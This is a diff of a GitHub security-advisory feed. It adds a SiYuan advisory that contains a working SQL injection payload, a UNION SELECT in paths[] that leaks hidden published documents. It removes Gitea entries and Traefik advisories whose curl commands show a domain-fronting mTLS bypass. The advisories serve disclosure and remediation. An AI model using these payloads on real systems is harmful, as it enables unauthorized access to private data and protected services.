+        <category label="severity" term="HIGH"/>
+        <published>2026-09-02T14:17:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: SQL Query in Block Search Exposes Hidden Published Document Content]]></title>
+        <id>https://github.com/advisories/GHSA-h89q-4j2h-7h88</id>
+        <link href="https://github.com/advisories/GHSA-h89q-4j2h-7h88"/>
+        <updated>2026-09-02T14:16:09.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Siyuan's block search endpoint concatenates attacker-controlled <code>paths[]</code> values into SQL predicates used by non-SQL search modes. Through Siyuan's publish service, an unauthenticated visitor is forwarded to the kernel with a reader-role token and can reach <code>POST /api/search/fullTextSearchBlock</code>.</p>
+<p>An attacker can inject a <code>UNION SELECT</code> through <code>paths[]</code> and return rows from hidden documents while projecting an allowed visible <code>box</code> and <code>path</code>. The post-query publish access filter trusts the projected <code>box</code> and <code>path</code>, so the injected hidden row is returned to the publish visitor.</p>
+<h2 id="affected-code">Affected Code</h2>
+<p>The API blocks explicit SQL search mode for non-admin users, but allows other search methods to use caller-controlled paths:</p>
+<pre><code class="language-go">if method == 2 &amp;&amp; !model.IsAdminRoleContext(c) {
+    ret.Code = -1
+    ret.Msg = "SQL search requires administrator privileges"
+    return
+}
+
+blocks, matchedBlockCount, matchedRootCount, pageCount, docMode := model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)
+if model.IsReadOnlyRoleContext(c) {
+    publishAccess := model.GetPublishAccess()
+    blocks = model.FilterBlocksByPublishAccess(c, publishAccess, blocks)
+}
+</code></pre>
+<p>Source: <code>input/siyuan/kernel/api/search.go</code></p>
+<p><code>paths[]</code> is parsed into notebook IDs and paths without SQL escaping or validation:</p>
+<pre><code class="language-go">path := p.(string)
+box := strings.TrimSpace(strings.Split(path, "/")[0])
+if "" != box {
+    boxes = append(boxes, box)
+}
+path = strings.TrimSpace(strings.TrimPrefix(path, box))
+if "" != path {
+    paths = append(paths, path)
+}
+</code></pre>
+<p>Source: <code>input/siyuan/kernel/api/search.go</code></p>
+<p>Those values are then concatenated directly into SQL:</p>
+<pre><code class="language-go">builder.WriteString(fmt.Sprintf("box = '%s'", box))
+</code></pre>
+<pre><code class="language-go">builder.WriteString(fmt.Sprintf("path LIKE '%s%%'", path))
+</code></pre>
+<p>Source: <code>input/siyuan/kernel/model/search.go</code></p>
+<p>Regexp search executes the resulting statement:</p>
+<pre><code class="language-go">stmt := "SELECT * FROM `blocks` WHERE " + fieldFilter + " AND type IN " + typeFilter
+stmt += boxFilter + pathFilter + ignoreFilter + " " + orderBy
+blocks := sql.SelectBlocksRegex(stmt, regex, Conf.Search.Name, Conf.Search.Alias, Conf.Search.Memo, Conf.Search.IAL, page, pageSize)
+</code></pre>
+<p>Source: <code>input/siyuan/kernel/model/search.go</code></p>
+<p>The read-only publish filter runs after SQL execution and trusts the returned row's <code>Box</code> and <code>Path</code>:</p>
+<pre><code class="language-go">for _, block := range blocks {
+    passwordID, password := GetPathPasswordByPublishAccess(block.Box, block.Path, publishAccess)
+    if CheckPathAccessableByPublishIgnore(block.Box, block.Path, publishIgnore) &amp;&amp; (c == nil || password == "" || CheckPublishAuthCookie(c, passwordID, password)) {
+        ret = append(ret, block)
+    }
+}
+</code></pre>
+<p>Source: <code>input/siyuan/kernel/model/publish_access.go</code></p>
+<h2 id="attack-scenario">Attack Scenario</h2>
+<ol>
+<li>A Siyuan instance enables the publish service.</li>
+<li>At least one document is visible to publish visitors.</li>
+<li>At least one document is hidden from publish visitors.</li>
+<li>The attacker sends a crafted <code>paths[]</code> value to the publish service's <code>/api/search/fullTextSearchBlock</code> endpoint.</li>
+<li>The injected SQL selects content from the hidden document while projecting the visible document's <code>box</code> and <code>path</code>.</li>
+<li>Siyuan returns the hidden block because the post-query publish filter checks the projected visible path.</li>
+</ol>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-http">POST /api/search/fullTextSearchBlock HTTP/1.1
+Host: &lt;publish-service-host&gt;
+Content-Type: application/json
+
+{
+  "query": "SECRET-LIVE-SQLI-20260609",
+  "method": 3,
+  "page": 1,
+  "pageSize": 10,
+  "paths": [
+    "VISIBLE_NOTEBOOK_ID/x%') UNION SELECT id,parent_id,root_id,hash,'VISIBLE_NOTEBOOK_ID','/VISIBLE_DOC.sy',hpath,name,alias,memo,tag,content,fcontent,markdown,length,type,subtype,ial,sort,created,updated FROM blocks WHERE path='/HIDDEN_DOC.sy' -- "
+  ]
+}
+</code></pre>
+<p><code>VISIBLE_NOTEBOOK_ID</code> and <code>/VISIBLE_DOC.sy</code> must reference content that the publish visitor can access. <code>/HIDDEN_DOC.sy</code> is the hidden document to read.</p>
+<h2 id="validation">Validation</h2>
+<p>Setup:</p>
+<ul>
+<li>Started <code>b3log/siyuan:latest</code> with an isolated temporary workspace.</li>
+<li>Created one notebook.</li>
+<li>Created a visible document containing <code>public apple marker</code>.</li>
+<li>Created a hidden document containing <code>SECRET-LIVE-SQLI-20260609 apple marker</code>.</li>
+<li>Marked the hidden document invisible with <code>POST /api/filetree/setPublishAccess</code>.</li>
+<li>Enabled publish mode with <code>POST /api/setting/setPublish</code>.</li>
+<li>Sent all exploit traffic through the publish service, which forwards requests with a reader-role token.</li>
+</ul>
+<p>Control request through the publish service for the hidden marker returned no blocks:</p>
+<pre><code class="language-json">{
+  "code": 0,
+  "msg": "",
+  "data": {
+    "blocks": [],
+    "docMode": false,
+    "matchedBlockCount": 1,
+    "matchedRootCount": 1,
+    "pageCount": 1
+  }
+}
+</code></pre>
+<p>The injected request through the publish service returned the hidden block:</p>
+<pre><code class="language-json">{
+  "code": 0,
+  "msg": "",
+  "data": {
+    "blocks": [
+      {
+        "box": "20260609095146-19hud1e",
+        "path": "/20260609095209-1ljs6o7.sy",
+        "hPath": "/HiddenDoc",
+        "id": "20260609095209-gttlrue",
+        "rootID": "20260609095209-yaz7i3h",
+        "parentID": "20260609095209-yaz7i3h",
+        "content": "&lt;mark&gt;SECRET-LIVE-SQLI-20260609&lt;/mark&gt; apple marker",
+        "markdown": "SECRET-LIVE-SQLI-20260609 apple marker",
+        "type": "NodeParagraph"
+      }
+    ],
+    "docMode": false,
+    "matchedBlockCount": 0,
+    "matchedRootCount": 0,
+    "pageCount": 0
+  }
+}
+</code></pre>
+<p>The returned row contains content from the hidden document, but its projected <code>box</code> and <code>path</code> point to the visible document. That is why the publish access filter accepts it.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated publish visitor can read hidden document block content from the <code>blocks</code> table. This bypasses Siyuan's publish visibility controls and exposes private note content that is not available through normal published document or search requests.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Build notebook and path predicates with bound SQL parameters instead of string concatenation. For example:</p>
+<pre><code class="language-sql">box = ?
+path LIKE ?
+</code></pre>
+<p>Then pass the user-controlled notebook ID and path prefix as query arguments.</p>
+<p>Additional hardening:</p>
+<ul>
+<li>Validate notebook IDs before query construction.</li>
+<li>Validate document paths against Siyuan's normalized <code>.sy</code> path format.</li>
+<li>Apply publish visibility restrictions before or inside SQL execution, rather than relying only on post-query filtering of returned row projections.</li>
+<li>Add regression tests for publish reader-role requests where <code>paths[]</code> contains SQL metacharacters such as <code>'</code>, <code>)</code>, <code>UNION</code>, and <code>--</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-h89q-4j2h-7h88">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-h89q-4j2h-7h88</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59834">https://nvd.nist.gov/vuln/detail/CVE-2026-59834</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/57bcad4b331836880bfe6be25d4180bdcf10db0d">https://github.com/siyuan-note/siyuan/commit/57bcad4b331836880bfe6be25d4180bdcf10db0d</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/d0f0fe146fb07d594fcadc4f48d4f7c30ac01d1e">https://github.com/siyuan-note/siyuan/commit/d0f0fe146fb07d594fcadc4f48d4f7c30ac01d1e</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h89q-4j2h-7h88">https://github.com/advisories/GHSA-h89q-4j2h-7h88</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h89q-4j2h-7h88</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-02T14:16:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[google.golang.org/grpc] gRPC-Go: Heap Memory Exhaustion (OOM) via HTTP/2 DATA Frame Fragmentation]]></title>
         <id>https://github.com/advisories/GHSA-vp52-pcj8-j9qc</id>
@@ -379,1063 +852,5 @@
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-03T21:31:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea] Gitea repository creation accepts insufficiently validated fields]]></title>
-        <id>https://github.com/advisories/GHSA-922f-hfwp-p56f</id>
-        <link href="https://github.com/advisories/GHSA-922f-hfwp-p56f"/>
-        <updated>2026-09-01T17:19:10.000Z</updated>
-        <content type="html"><![CDATA[<p>Gitea versions before 1.25.5 lack validation constraints for repository creation fields, including length-limited template fields and trust model or object format values.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22547">https://nvd.nist.gov/vuln/detail/CVE-2026-22547</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/36671">https://github.com/go-gitea/gitea/pull/36671</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/36757">https://github.com/go-gitea/gitea/pull/36757</a></li>
-<li><a href="https://blog.gitea.com/release-of-1.25.5">https://blog.gitea.com/release-of-1.25.5</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.25.5">https://github.com/go-gitea/gitea/releases/tag/v1.25.5</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/569c49debe06f30a2bbb50b3812e705c556b8adf">https://github.com/go-gitea/gitea/commit/569c49debe06f30a2bbb50b3812e705c556b8adf</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/b3bc79262d106f4259f82a26609e4738b618152b">https://github.com/go-gitea/gitea/commit/b3bc79262d106f4259f82a26609e4738b618152b</a></li>
-<li><a href="https://github.com/advisories/GHSA-922f-hfwp-p56f">https://github.com/advisories/GHSA-922f-hfwp-p56f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-922f-hfwp-p56f</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-03T21:31:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea]  Gitea exposes tracked time entries without repository authorization]]></title>
-        <id>https://github.com/advisories/GHSA-fhq3-p242-2qpf</id>
-        <link href="https://github.com/advisories/GHSA-fhq3-p242-2qpf"/>
-        <updated>2026-09-01T17:17:32.000Z</updated>
-        <content type="html"><![CDATA[<p>Gitea versions before 1.25.5 have insufficient permission checks when listing tracked time entries.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-20909">https://nvd.nist.gov/vuln/detail/CVE-2026-20909</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/36662">https://github.com/go-gitea/gitea/pull/36662</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/36744">https://github.com/go-gitea/gitea/pull/36744</a></li>
-<li><a href="https://blog.gitea.com/release-of-1.25.5">https://blog.gitea.com/release-of-1.25.5</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.25.5">https://github.com/go-gitea/gitea/releases/tag/v1.25.5</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/00566cc953dba772d2f38aa475d235fead461605">https://github.com/go-gitea/gitea/commit/00566cc953dba772d2f38aa475d235fead461605</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/ed57c70176a6cac63f48ddf6b0d5f4f72cfea963">https://github.com/go-gitea/gitea/commit/ed57c70176a6cac63f48ddf6b0d5f4f72cfea963</a></li>
-<li><a href="https://github.com/advisories/GHSA-fhq3-p242-2qpf">https://github.com/advisories/GHSA-fhq3-p242-2qpf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fhq3-p242-2qpf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-03T21:31:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik: SNICheck ignores wildcard TLSOptions mappings, allowing domain-fronted mTLS bypass]]></title>
-        <id>https://github.com/advisories/GHSA-5r4w-85f3-pw66</id>
-        <link href="https://github.com/advisories/GHSA-5r4w-85f3-pw66"/>
-        <updated>2026-09-01T14:06:29.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>There is a high severity vulnerability in Traefik's domain-fronting protection (<code>SNICheck</code>) that allows an unauthenticated client to bypass mutual TLS enforced through wildcard router <code>TLSOptions</code>. When a router uses a wildcard host rule such as <code>Host(</code>*.example.com<code>)</code> with stricter TLS options (for example <code>RequireAndVerifyClientCert</code>), <code>SNICheck</code> resolves the TLS options for the HTTP <code>Host</code> header using exact map lookups only and never applies wildcard matching. If another permissive SNI is served on the same entrypoint, an attacker can complete the TLS handshake under the permissive options and then send an HTTP <code>Host</code> header targeting the wildcard-protected backend, reaching it without presenting a client certificate. This affects the regular HTTPS / HTTP-2 path and does not require HTTP/3.</p>
-<h2 id="patches">Patches</h2>
-<ul>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.3">https://github.com/traefik/traefik/releases/tag/v3.7.3</a></li>
-</ul>
-<h2 id="for-more-information">For more information</h2>
-<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
-<details>
-<summary>Original Description</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>Traefik's <code>SNICheck</code> domain-fronting protection ignores wildcard <code>TLSOptions</code> mappings. A wildcard router such as <code>Host("*.example.com")</code> can require mTLS for direct access, but an unauthenticated client can complete the TLS handshake with another permissive SNI on the same entrypoint and then send <code>Host: api.example.com</code> / HTTP request authority <code>api.example.com</code> to reach the wildcard-protected backend.</p>
-<p>This issue does not require HTTP/3. The PoC uses the regular HTTPS/HTTP2 path and abuses the domain-fronting consistency check between TLS SNI and the HTTP <code>Host</code> header.</p>
-<p>For HTTP/2, this corresponds to the request authority / <code>Host</code> value as exposed to Traefik's HTTP request handling.</p>
-<h3 id="details">Details</h3>
-<p>For the v3 rule-syntax / file-provider path used in this PoC, wildcard <code>Host</code> / <code>HostSNI</code> matching and TLSOptions association for wildcard domains were introduced in Traefik v3.7. The normal HTTPS/TCP router path uses wildcard-aware matching. The <code>SNICheck</code> middleware does not.</p>
-<p>The router build records TLS option names for host rules:</p>
-<pre><code class="language-go">domains, err := httpmuxer.ParseDomains(routerHTTPConfig.Rule)
-// ...
-tlsOptionsForHost[domain] = tlsOptionsName
-</code></pre>
-<p>The HTTPS forwarder then installs SNI routes:</p>
-<pre><code class="language-go">rule := fmt.Sprintf(`HostSNI(%q)`, sniHost)
-</code></pre>
-<p><code>HostSNI</code> matching is wildcard-aware:</p>
-<pre><code class="language-go">return muxer.DomainMatchHostExpression(meta.serverName, hostExpr)
-</code></pre>
-<p>But <code>pkg/middlewares/snicheck/snicheck.go</code> resolves the host's TLS option name with exact lookups only:</p>
-<pre><code class="language-go">func findTLSOptionName(tlsOptionsForHost map[string]string, host string, fqdn bool) string {
-    name := findTLSOptName(tlsOptionsForHost, host, fqdn)
-    if name != "" {
-        return name
-    }
-
-    name = findTLSOptName(tlsOptionsForHost, strings.ToLower(host), fqdn)
-    if name != "" {
-        return name
-    }
-
-    return traefiktls.DefaultTLSConfigName
-}
-
-func findTLSOptName(tlsOptionsForHost map[string]string, host string, fqdn bool) string {
-    if tlsOptions, ok := tlsOptionsForHost[host]; ok {
-        return tlsOptions
-    }
-
-    if !fqdn {
-        return ""
-    }
-
-    if last := len(host) - 1; last &gt;= 0 &amp;&amp; host[last] == '.' {
-        if tlsOptions, ok := tlsOptionsForHost[host[:last]]; ok {
-            return tlsOptions
-        }
-
-        return ""
-    }
-
-    if tlsOptions, ok := tlsOptionsForHost[host+"."]; ok {
-        return tlsOptions
-    }
-
-    return ""
-}
-</code></pre>
-<p>There is no wildcard matching step for entries such as <code>*.example.com</code>. As a result, <code>Host: api.example.com</code> can be classified as using default TLS options even though the router matched a wildcard host with stricter <code>TLSOptions</code>.</p>
-<p>Preconditions:</p>
-<ul>
-<li>A protected router uses wildcard <code>Host</code> / <code>HostSNI</code> with router-specific <code>TLSOptions</code>.</li>
-<li>The protected wildcard router uses stricter TLS options, such as <code>RequireAndVerifyClientCert</code>.</li>
-<li>Another SNI/default TLS path on the same entrypoint allows a handshake without a client certificate.</li>
-<li>The client can send an HTTP <code>Host</code> header different from the TLS SNI.</li>
-</ul>
-<p>Relationship to my previous HTTP/3 report:</p>
-<p>I previously submitted a related HTTP/3 mTLS bypass involving <code>Router.GetTLSGetClientInfo()</code> and exact/case-sensitive SNI lookup.</p>
-<p>This report is separate. It does not require HTTP/3 or QUIC. It affects the regular HTTPS/HTTP2 path and is caused by <code>SNICheck</code> resolving <code>tlsOptionsForHost</code> with exact lookups only, without wildcard matching. The exploit uses domain fronting: a permissive TLS SNI is used for the handshake, while the HTTP request authority / <code>Host</code> header targets a wildcard-protected backend.</p>
-<p>Relationship to public issue #12349:</p>
-<p>This is related to public issue #12349, where wildcard hosts were observed to be classified as <code>default</code> by <code>SNICheck</code>, causing unexpected <code>421 Misdirected Request</code> responses in some wildcard setups:</p>
-<pre><code class="language-text">TLS options difference: SNI:https-ext@file, Header:default
-</code></pre>
-<p>The public issue demonstrates the same wildcard resolution gap as an availability/operational problem. This report demonstrates a security-impacting false-negative variant that can bypass router-specific mTLS when a permissive SNI exists on the same entrypoint. When the attacker chooses a permissive/default SNI and sends a protected wildcard host in the HTTP <code>Host</code> header, both sides can be classified as <code>default</code>, so <code>SNICheck</code> does not return <code>421</code>. The later HTTP router then matches the wildcard-protected backend and the request is forwarded without enforcing the wildcard route's mTLS policy.</p>
-<p>Related wildcard <code>SNICheck</code> behavior has also been observed in Kubernetes Ingress setups, as described in public issue #12349. The PoC below uses the file provider and v3 rule syntax to keep the reproduction minimal and self-contained.</p>
-<p>Minimal dynamic configuration:</p>
-<pre><code class="language-yaml">http:
-  routers:
-    protected:
-      rule: Host(`*.example.com`)
-      service: protected
-      tls:
-        options: mtls
-
-    public:
-      rule: Host(`public.example.net`)
-      service: public
-      tls: {}
-
-  services:
-    protected:
-      loadBalancer:
-        servers:
-          - url: http://protected:80
-
-    public:
-      loadBalancer:
-        servers:
-          - url: http://public:80
-
-tls:
-  certificates:
-    - certFile: /certs/server.crt
-      keyFile: /certs/server.key
-
-  options:
-    mtls:
-      clientAuth:
-        caFiles:
-          - /certs/ca.crt
-        clientAuthType: RequireAndVerifyClientCert
-</code></pre>
-<p>Minimal Docker Compose:</p>
-<pre><code class="language-yaml">services:
-  traefik:
-    image: traefik:v3.7.1
-    command:
-      - --log.level=DEBUG
-      - --entrypoints.websecure.address=:8443
-      - --providers.file.filename=/etc/traefik/dynamic.yml
-      - --providers.file.watch=false
-    ports:
-      - "8443:8443"
-    volumes:
-      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
-      - ./certs:/certs:ro
-    depends_on:
-      - protected
-      - public
-
-  protected:
-    image: traefik/whoami:v1.11
-    command:
-      - --name=PROTECTED
-
-  public:
-    image: traefik/whoami:v1.11
-    command:
-      - --name=PUBLIC
-</code></pre>
-<p>Certificate generation:</p>
-<pre><code class="language-bash">rm -rf certs
-mkdir -p certs
-
-openssl req -x509 -newkey rsa:2048 -nodes -days 7 \
-  -keyout certs/ca.key \
-  -out certs/ca.crt \
-  -subj "/CN=traefik-poc-ca"
-
-openssl req -newkey rsa:2048 -nodes \
-  -keyout certs/server.key \
-  -out certs/server.csr \
-  -subj "/CN=public.example.net" \
-  -addext "subjectAltName=DNS:public.example.net,DNS:api.example.com,DNS:*.example.com"
-
-openssl x509 -req \
-  -in certs/server.csr \
-  -CA certs/ca.crt \
-  -CAkey certs/ca.key \
-  -CAcreateserial \
-  -out certs/server.crt \
-  -days 7 \
-  -sha256 \
-  -copy_extensions copyall
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p>Start Traefik with the configuration above.</p>
-<p>Test environment:</p>
-<ul>
-<li>Traefik images tested: <code>v3.7.0</code>, <code>v3.7.1</code></li>
-<li>Backend image: <code>traefik/whoami:v1.11</code></li>
-<li>Client: <code>curl</code> with HTTPS/HTTP2 support</li>
-<li>EntryPoint: TCP port <code>8443</code> exposed locally</li>
-<li>Provider: file provider</li>
-</ul>
-<p>Control 1: the permissive public route works normally and reaches the public backend:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 200
-Name: PUBLIC
-Host: public.example.net:8443
-</code></pre>
-<p>Control 2: direct access to the wildcard-protected host without a client certificate is blocked:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve api.example.com:8443:127.0.0.1 \
-  https://api.example.com:8443/
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">TLS alert ... certificate required
-</code></pre>
-<p>Bypass: use the permissive public SNI for the TLS handshake, but send the protected wildcard host in the HTTP request:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/ \
-  -H 'Host: api.example.com'
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 200
-Name: PROTECTED
-Host: api.example.com
-</code></pre>
-<p>The curl verbose output shows that the HTTP/2 request authority / <code>Host</code> value is <code>api.example.com</code>, while the TLS SNI is taken from the URL host <code>public.example.net</code>:</p>
-<pre><code class="language-text">* [HTTP/2] [1] [:authority: api.example.com]
-&gt; Host: api.example.com
-</code></pre>
-<p>Expected result:</p>
-<pre><code class="language-text">HTTP/2 421
-Misdirected Request
-</code></pre>
-<p>Traefik should return <code>421 Misdirected Request</code> because the HTTP <code>Host</code> header resolves to the wildcard route's <code>mtls</code> TLSOptions while the TLS SNI resolves to permissive/default TLSOptions.</p>
-<p>Negative control with exact host:</p>
-<p>Replacing the protected router rule with exact <code>Host("api.example.com")</code> while keeping <code>tls.options=mtls</code> causes the same domain-fronting request to be rejected:</p>
-<pre><code class="language-yaml">http:
-  routers:
-    protected:
-      rule: Host(`api.example.com`)
-      service: protected
-      tls:
-        options: mtls
-</code></pre>
-<p>Run the same request:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/ \
-  -H 'Host: api.example.com'
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 421
-Misdirected Request
-</code></pre>
-<p>This shows that the bypass depends on wildcard TLSOptions resolution in <code>SNICheck</code>, not on a generic failure of the domain-fronting check.</p>
-<p>Regression test used during validation:</p>
-<pre><code class="language-bash">go test ./pkg/middlewares/snicheck \
-  -run TestSNICheck_WildcardTLSOptionsCurrentBehavior \
-  -count=1
-</code></pre>
-<p>Version matrix observed with Docker images:</p>
-<pre><code class="language-text">v3.6.17: this file-provider wildcard PoC did not reproduce; the wildcard route returned 404 in this setup
-v3.7.0: affected
-v3.7.1: affected
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Deployments that use wildcard router <code>TLSOptions</code> for client certificate authentication can expose protected backends to unauthenticated clients when another permissive SNI exists on the same entrypoint.</p>
-<p>The TLS handshake is completed under the permissive/default TLS options selected for the SNI, while the later HTTP router still dispatches the request to the wildcard route that was configured with mTLS-specific TLSOptions. This bypasses a security boundary that administrators can reasonably expect to be enforced by <code>tls.options=mtls</code> on the wildcard route.</p>
-<p>A possible fix would be for <code>SNICheck</code> to resolve <code>tlsOptionsForHost</code> using the same wildcard-aware host matching semantics used by the router / <code>HostSNI</code> matching, rather than exact map lookups only.</p>
-<p>Possible workarounds until a fix is available:</p>
-<ul>
-<li>Avoid wildcard router <code>TLSOptions</code> for mTLS access control.</li>
-<li>Enumerate exact protected hostnames instead of using wildcard <code>Host</code> rules.</li>
-<li>Enforce mTLS in the default TLS options as well.</li>
-<li>Avoid mixing permissive and mTLS-protected hosts on the same entrypoint.</li>
-<li>Block or reject domain-fronted requests at another layer.</li>
-</ul>
-</details>
-
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-5r4w-85f3-pw66">https://github.com/traefik/traefik/security/advisories/GHSA-5r4w-85f3-pw66</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.3">https://github.com/traefik/traefik/releases/tag/v3.7.3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48491">https://nvd.nist.gov/vuln/detail/CVE-2026-48491</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-48491">https://access.redhat.com/security/cve/CVE-2026-48491</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2491923">https://bugzilla.redhat.com/show_bug.cgi?id=2491923</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.48">https://github.com/traefik/traefik/releases/tag/v2.11.48</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.19">https://github.com/traefik/traefik/releases/tag/v3.6.19</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48491.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48491.json</a></li>
-<li><a href="https://github.com/advisories/GHSA-5r4w-85f3-pw66">https://github.com/advisories/GHSA-5r4w-85f3-pw66</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5r4w-85f3-pw66</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-16T19:02:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] Traefik: SNICheck ignores wildcard TLSOptions mappings, allowing domain-fronted mTLS bypass]]></title>
-        <id>https://github.com/advisories/GHSA-5r4w-85f3-pw66</id>
-        <link href="https://github.com/advisories/GHSA-5r4w-85f3-pw66"/>
-        <updated>2026-09-01T14:06:29.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>There is a high severity vulnerability in Traefik's domain-fronting protection (<code>SNICheck</code>) that allows an unauthenticated client to bypass mutual TLS enforced through wildcard router <code>TLSOptions</code>. When a router uses a wildcard host rule such as <code>Host(</code>*.example.com<code>)</code> with stricter TLS options (for example <code>RequireAndVerifyClientCert</code>), <code>SNICheck</code> resolves the TLS options for the HTTP <code>Host</code> header using exact map lookups only and never applies wildcard matching. If another permissive SNI is served on the same entrypoint, an attacker can complete the TLS handshake under the permissive options and then send an HTTP <code>Host</code> header targeting the wildcard-protected backend, reaching it without presenting a client certificate. This affects the regular HTTPS / HTTP-2 path and does not require HTTP/3.</p>
-<h2 id="patches">Patches</h2>
-<ul>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.3">https://github.com/traefik/traefik/releases/tag/v3.7.3</a></li>
-</ul>
-<h2 id="for-more-information">For more information</h2>
-<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
-<details>
-<summary>Original Description</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>Traefik's <code>SNICheck</code> domain-fronting protection ignores wildcard <code>TLSOptions</code> mappings. A wildcard router such as <code>Host("*.example.com")</code> can require mTLS for direct access, but an unauthenticated client can complete the TLS handshake with another permissive SNI on the same entrypoint and then send <code>Host: api.example.com</code> / HTTP request authority <code>api.example.com</code> to reach the wildcard-protected backend.</p>
-<p>This issue does not require HTTP/3. The PoC uses the regular HTTPS/HTTP2 path and abuses the domain-fronting consistency check between TLS SNI and the HTTP <code>Host</code> header.</p>
-<p>For HTTP/2, this corresponds to the request authority / <code>Host</code> value as exposed to Traefik's HTTP request handling.</p>
-<h3 id="details">Details</h3>
-<p>For the v3 rule-syntax / file-provider path used in this PoC, wildcard <code>Host</code> / <code>HostSNI</code> matching and TLSOptions association for wildcard domains were introduced in Traefik v3.7. The normal HTTPS/TCP router path uses wildcard-aware matching. The <code>SNICheck</code> middleware does not.</p>
-<p>The router build records TLS option names for host rules:</p>
-<pre><code class="language-go">domains, err := httpmuxer.ParseDomains(routerHTTPConfig.Rule)
-// ...
-tlsOptionsForHost[domain] = tlsOptionsName
-</code></pre>
-<p>The HTTPS forwarder then installs SNI routes:</p>
-<pre><code class="language-go">rule := fmt.Sprintf(`HostSNI(%q)`, sniHost)
-</code></pre>
-<p><code>HostSNI</code> matching is wildcard-aware:</p>
